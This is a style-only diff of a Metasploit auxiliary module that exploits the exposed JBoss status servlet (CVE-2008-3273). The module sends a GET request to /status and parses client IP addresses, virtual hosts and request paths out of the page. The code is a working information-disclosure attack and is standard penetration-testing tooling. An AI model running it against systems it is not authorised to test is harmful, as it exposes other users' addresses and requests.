@@ -10,57 +10,55 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'JBoss Status Servlet Information Gathering',
+      'Name' => 'JBoss Status Servlet Information Gathering',
       'Description' => %q{
         This module queries the JBoss status servlet to collect sensitive
         information, including URL paths, GET parameters and client IP addresses.
         This module has been tested against JBoss 4.0, 4.2.2 and 4.2.3.
       },
-      'References'  =>
-        [
-          ['CVE', '2008-3273'],
-          ['CVE', '2010-1429'], # regression
-          ['URL', 'https://seclists.org/fulldisclosure/2011/Sep/139'],
-          ['URL', 'https://owasp.org/www-pdf-archive/OWASP3011_Luca.pdf'],
-          ['URL', 'https://www.slideshare.net/chrisgates/lares-fromlowtopwned']
-        ],
-      'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
-      'License'     => MSF_LICENSE
+      'References' => [
+        ['CVE', '2008-3273'],
+        ['CVE', '2010-1429'], # regression
+        ['URL', 'https://seclists.org/fulldisclosure/2011/Sep/139'],
+        ['URL', 'https://owasp.org/www-pdf-archive/OWASP3011_Luca.pdf'],
+        ['URL', 'https://www.slideshare.net/chrisgates/lares-fromlowtopwned']
+      ],
+      'Author' => 'Matteo Cantoni <goony[at]nothink.org>',
+      'License' => MSF_LICENSE
     )
 
     register_options([
       Opt::RPORT(8080),
-      OptString.new('TARGETURI', [ true,  'The JBoss status servlet URI path', '/status'])
+      OptString.new('TARGETURI', [ true, 'The JBoss status servlet URI path', '/status'])
     ])
   end
 
   def run_host(target_host)
     jpath = normalize_uri(target_uri.to_s)
 
-    @requests  = []
+    @requests = []
 
     vprint_status("#{rhost}:#{rport} - Collecting data through #{jpath}...")
 
     res = send_request_raw({
-      'uri'    => jpath,
+      'uri' => jpath,
       'method' => 'GET'
     })
 
     # detect JBoss application server
     if res and res.code == 200 and res.body.match(/<title>Tomcat Status<\/title>/)
-      http_fingerprint({:response => res})
+      http_fingerprint({ :response => res })
 
       html_rows = res.body.split(/<strong>/)
       html_rows.each do |row|
-
-        #Stage      Time    B Sent  B Recv  Client  VHost   Request
-        #K  150463510 ms    ?       ?       1.2.3.4 ?       ?
+        # Stage      Time    B Sent  B Recv  Client  VHost   Request
+        # K  150463510 ms    ?       ?       1.2.3.4 ?       ?
 
         # filter client requests
         if row.match(/(.*)<\/strong><\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td nowrap>(.*)<\/td><td nowrap>(.*)<\/td><\/tr>/)
 
-          j_src  = $5
-          j_dst  = $6
+          j_src = $5
+          j_dst = $6
           j_path = $7
 
           @requests << [j_src, j_dst, j_path]
@@ -87,20 +85,20 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{rhost}:#{rport} JBoss application server found")
 
     req_table = Rex::Text::Table.new(
-      'Header'  => 'JBoss application server requests',
-        'Indent'  => 1,
-        'Columns' => ['Client', 'Vhost target', 'Request']
+      'Header' => 'JBoss application server requests',
+      'Indent' => 1,
+      'Columns' => ['Client', 'Vhost target', 'Request']
     )
 
     @requests.each do |r|
       req_table << r
       report_note({
-        :host  => target_host,
+        :host => target_host,
         :proto => 'tcp',
         :sname => (ssl ? 'https' : 'http'),
-        :port  => rport,
-        :type  => 'JBoss application server info',
-        :data  => {
+        :port => rport,
+        :type => 'JBoss application server info',
+        :data => {
           :rhost => rhost,
           :rport => rport,
           :request => r[2]
